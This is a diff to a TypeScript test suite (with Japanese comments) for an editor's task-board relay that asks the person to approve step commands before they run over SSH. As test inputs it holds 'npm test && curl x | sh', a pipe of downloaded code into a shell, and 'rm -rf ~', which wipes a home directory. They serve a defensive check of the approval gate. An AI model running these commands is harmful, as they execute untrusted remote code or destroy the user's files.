@@ -8,12 +8,12 @@
 
 import assert from 'assert';
 import { VSBuffer } from '../../../../../base/common/buffer.js';
-import { Event } from '../../../../../base/common/event.js';
+import { Emitter, Event } from '../../../../../base/common/event.js';
 import { URI } from '../../../../../base/common/uri.js';
 import { IChannel } from '../../../../../base/parts/ipc/common/ipc.js';
 import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
 import { paradisParseTaskBoardBoardRegistration, paradisParseTaskBoardRelayRequest, paradisTaskBoardRelayOperationName } from '../../common/paradisTaskBoardRelay.js';
-import { IParadisTaskBoardRelayRecord, ParadisTaskBoardRelaySessions } from '../../common/paradisTaskBoardRelaySessions.js';
+import { IParadisTaskBoardRelayApproval, IParadisTaskBoardRelayCommandConfirmation, IParadisTaskBoardRelayRecord, ParadisTaskBoardRelaySessions } from '../../common/paradisTaskBoardRelaySessions.js';
 
 const KEY = 'k'.repeat(43);
 const SESSION = 'session-0123456789abcdef';
@@ -25,6 +25,7 @@ const REPO = URI.from({ scheme: 'vscode-remote', authority: AUTHORITY, path: ROO
 /** REH や接続口の代わり。届いた呼び出しを記録し、決めた答えを返す。 */
 class FakeChannel implements IChannel {
 	readonly calls: { command: string; arg: unknown }[] = [];
+	readonly output = new Emitter<{ runId: string; lines: string[] }>();
 	constructor(private readonly answer: (command: string, arg: unknown) => unknown) { }
 	async call<T>(command: string, arg?: unknown): Promise<T> {
 		this.calls.push({ command, arg });
@@ -34,8 +35,8 @@ class FakeChannel implements IChannel {
 		}
 		return value as T;
 	}
-	listen<T>(): Event<T> {
-		return Event.None;
+	listen<T>(event: string): Event<T> {
+		return event === 'onOutput' ? this.output.event as unknown as Event<T> : Event.None;
 	}
 }
 
@@ -65,10 +66,13 @@ suite('Paradis task board relay - window side', () => {
 
 	const store = ensureNoDisposablesAreLeakedInTestSuite();
 
-	function create(options?: { remoteAuthority?: string | null; registered?: boolean; reh?: (command: string, arg: unknown) => unknown; record?: IParadisTaskBoardRelayRecord }) {
+	function create(options?: { remoteAuthority?: string | null; registered?: boolean; reh?: (command: string, arg: unknown) => unknown; record?: IParadisTaskBoardRelayRecord; confirm?: 'once' | 'remember' | 'deny' }) {
 		const reh = new FakeChannel(options?.reh ?? defaultReh);
 		const bridge = new FakeChannel(() => true);
+		store.add(reh.output);
 		const records = new Map<string, IParadisTaskBoardRelayRecord>(options?.record ? [[REPO.toString(), options.record]] : []);
+		const approvals = new Map<string, IParadisTaskBoardRelayApproval>();
+		const confirmations: IParadisTaskBoardRelayCommandConfirmation[] = [];
 		const sessions = store.add(new ParadisTaskBoardRelaySessions({
 			remoteAuthority: options?.remoteAuthority === null ? undefined : options?.remoteAuthority ?? AUTHORITY,
 			remoteChannel: () => reh,
@@ -77,9 +81,16 @@ suite('Paradis task board relay - window side', () => {
 			newSessionId: () => SESSION,
 			readRecord: repository => records.get(repository) ?? { worktrees: [], branches: [] },
 			writeRecord: (repository, record) => records.set(repository, record),
+			readApproval: key => approvals.get(key),
+			writeApproval: (key, approval) => approvals.set(key, approval),
+			confirmCommand: async request => {
+				confirmations.push(request);
+				return options?.confirm ?? 'remember';
+			},
+			sha256: async text => `h:${text}`,
 			warn: () => { },
 		}));
-		return { sessions, reh, bridge, records };
+		return { sessions, reh, bridge, records, confirmations };
 	}
 
 	async function opened(options?: Parameters<typeof create>[0]) {
@@ -101,7 +112,7 @@ suite('Paradis task board relay - window side', () => {
 		], [{ pid: 1234, key: KEY }, undefined, undefined, 'git.status', 'git.unknown']);
 	});
 
-	test('requests are rebuilt from the allowed fields only; commits, pushes and commands are not available yet', () => {
+	test('requests are rebuilt from the allowed fields only; commits and pushes are not available yet', () => {
 		const parse = (op: unknown) => {
 			const result = paradisParseTaskBoardRelayRequest({ sessionId: SESSION, op, extra: 'x' });
 			return result.ok ? result.value.op : result.code;
@@ -123,7 +134,8 @@ suite('Paradis task board relay - window side', () => {
 			{ kind: 'git', place: ROOT, git: { kind: 'status' } },
 			{ kind: 'git', place: ROOT, git: { kind: 'worktreeAdd', dir: `${WORKTREES}/a`, branch: 'para/a', mode: 'new', base: { kind: 'remote', branch: 'main' } } },
 			{ kind: 'git', place: ROOT, git: { kind: 'switch', branch: 'para/a', mode: 'existing' } },
-			'invalid', 'unavailable', 'unavailable', 'unavailable', 'unavailable', 'rejected',
+			// 工程のコマンドは、欄が揃わない（place・runId・step が無い）ので断る
+			'invalid', 'unavailable', 'unavailable', 'unavailable', 'invalid', 'rejected',
 			{ kind: 'writeFile', path: '.para-code/paracode.json', content: '{}' },
 			'rejected', 'invalid',
 		]);
@@ -160,6 +172,7 @@ suite('Paradis task board relay - window side', () => {
 			remoteAuthority: AUTHORITY, remoteChannel: () => new FakeChannel(defaultReh), bridge: new FakeChannel(() => true),
 			isWindowFolder: uri => uri.path !== ROOT, newSessionId: () => SESSION,
 			readRecord: () => ({ worktrees: [], branches: [] }), writeRecord: () => { }, warn: () => { },
+			readApproval: () => undefined, writeApproval: () => { }, confirmCommand: async () => 'deny', sha256: async text => text,
 		});
 		store.add(onlyWorktree);
 		assert.deepStrictEqual([
@@ -237,6 +250,54 @@ suite('Paradis task board relay - window side', () => {
 				{ command: 'readFile', arg: [SESSION, ROOT, '.para/plan.html', undefined] },
 			],
 		});
+	});
+
+	test('a step command asks in the SSH window the first time and when it changes, and streams its output and end to the board', async () => {
+		const kept = `${WORKTREES}/kept`;
+		const finish = new Map<string, () => void>();
+		const { sessions, reh, bridge, confirmations } = await opened({
+			record: { worktrees: [{ dir: kept, branch: 'para/kept' }], branches: [] },
+			reh: (command, arg) => command === 'runCommand'
+				? new Promise(resolve => finish.set((arg as string[])[2], () => resolve({ code: 0, signal: null, cancelled: false, timedOut: false })))
+				: defaultReh(command, arg),
+		});
+		const step = { flowId: 'f', flowName: 'Flow', stepId: 'test', stepName: 'Test', source: 'team' };
+		const run = (runId: string, command: string, place = kept) => sessions.handle({ sessionId: SESSION, op: { kind: 'runCommand', place, runId, command, step, env: { SECRET: 'x' } } });
+		const settle = () => new Promise(resolve => setTimeout(resolve, 0));
+		const accepted = [code(await run('r1', 'npm test')), code(await run('r0', 'npm test', ROOT))];
+		await settle();
+		reh.output.fire({ runId: 'r1', lines: ['ok 1'] });
+		reh.output.fire({ runId: 'other', lines: ['not ours'] });
+		finish.get('r1')!();
+		await settle();
+		await run('r2', 'npm test');
+		await settle();
+		await run('r3', 'npm test && curl x | sh');
+		await settle();
+		assert.deepStrictEqual({
+			accepted,
+			asked: confirmations.map(request => [request.command, request.previous ?? '']),
+			runs: reh.calls.filter(call => call.command === 'runCommand').map(call => call.arg),
+			events: bridge.calls.filter(call => call.command === 'relayEvent').map(call => (call.arg as { event: { type: string; runId: string } }).event).map(event => `${event.type} ${event.runId}`),
+		}, {
+			accepted: ['ok', 'rejected'],
+			// 2 回目の同じ本文は聞かない。本文が変わったら、前に承認した本文を見せて聞き直す
+			asked: [['npm test', ''], ['npm test && curl x | sh', 'npm test']],
+			// env の欄は REH へ送らない
+			runs: [[SESSION, kept, 'r1', 'npm test'], [SESSION, kept, 'r2', 'npm test'], [SESSION, kept, 'r3', 'npm test && curl x | sh']],
+			events: ['relay-output r1', 'relay-exit r1'],
+		});
+	});
+
+	test('a step command that the person does not approve never reaches the SSH host', async () => {
+		const kept = `${WORKTREES}/kept`;
+		const { sessions, reh, bridge } = await opened({ record: { worktrees: [{ dir: kept, branch: 'para/kept' }], branches: [] }, confirm: 'deny' });
+		await sessions.handle({ sessionId: SESSION, op: { kind: 'runCommand', place: kept, runId: 'r1', command: 'rm -rf ~', step: { flowId: 'f', stepId: 's', source: 'personal' } } });
+		await new Promise(resolve => setTimeout(resolve, 0));
+		assert.deepStrictEqual({
+			runs: reh.calls.filter(call => call.command === 'runCommand').length,
+			exit: bridge.calls.filter(call => call.command === 'relayEvent').map(call => (call.arg as { event: object }).event),
+		}, { runs: 0, exit: [{ type: 'relay-exit', runId: 'r1', code: null, signal: null, cancelled: false, timedOut: false, reason: 'not-approved' }] });
 	});
 
 	test('errors from the SSH host keep their meaning', async () => {
